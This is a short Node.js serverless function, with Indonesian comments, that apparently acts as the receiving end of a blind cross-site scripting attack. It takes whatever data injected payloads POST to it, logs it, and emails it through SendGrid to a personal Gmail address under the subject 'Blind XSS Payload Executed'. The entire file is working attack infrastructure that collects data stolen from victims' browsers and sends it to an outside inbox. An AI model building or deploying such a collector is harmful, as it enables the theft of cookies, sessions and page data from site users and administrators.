const sgMail = require('@sendgrid/mail');
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: 'Method Not Allowed',
        };
    }

    const data = JSON.parse(event.body);
    console.log('Received data:', data);

    // Kirim email
    const msg = {
        to: 'gerhanagulita@gmail.com', // Email tujuan
        from: 'no-reply@blindxss.com', // Email pengirim (ganti dengan email Anda)
        subject: 'Blind XSS Payload Executed',
        text: `Blind XSS payload executed. Data: ${JSON.stringify(data, null, 2)}`,
    };

    try {
        await sgMail.send(msg);
        console.log('Email sent');
    } catch (error) {
        console.error('Error sending email:', error);
    }

    return {
        statusCode: 200,
        body: JSON.stringify({ message: 'Data received and email sent' }),
    };
};